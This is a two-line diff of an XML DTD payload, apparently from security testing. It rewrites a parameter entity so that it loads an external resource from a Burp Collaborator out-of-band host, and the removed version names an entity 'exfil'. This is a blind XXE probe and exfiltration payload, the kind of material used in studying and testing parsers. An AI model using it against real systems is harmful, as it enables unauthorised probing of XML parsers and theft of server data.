@@ -1,2 +1,2 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!ENTITY % param1 "<!ENTITY % exfil SYSTEM 'http://9lvfhs6lynj163t6l243jlxjtaz3ns.burpcollaborator.net/'>">
+<!ENTITY % param1 SYSTEM "http://9lvfhs6lynj163t6l243jlxjtaz3ns.burpcollaborator.net/">
